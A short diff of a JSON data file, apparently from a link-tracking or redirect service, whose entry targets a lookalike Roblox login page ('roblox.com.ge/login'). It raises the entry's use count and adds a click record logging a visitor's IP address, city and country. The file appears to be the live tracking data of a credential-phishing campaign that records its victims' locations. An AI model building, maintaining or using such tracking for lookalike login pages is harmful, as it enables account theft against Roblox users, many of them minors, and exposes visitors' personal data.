@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1466,
+    "useCount": 1467,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11894,6 +11894,14 @@
         "ip": "180.194.14.51",
         "country": "Philippines",
         "city": "Villamor",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777437409524,
+        "ip": "124.217.126.103",
+        "country": "Philippines",
+        "city": "Davao City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
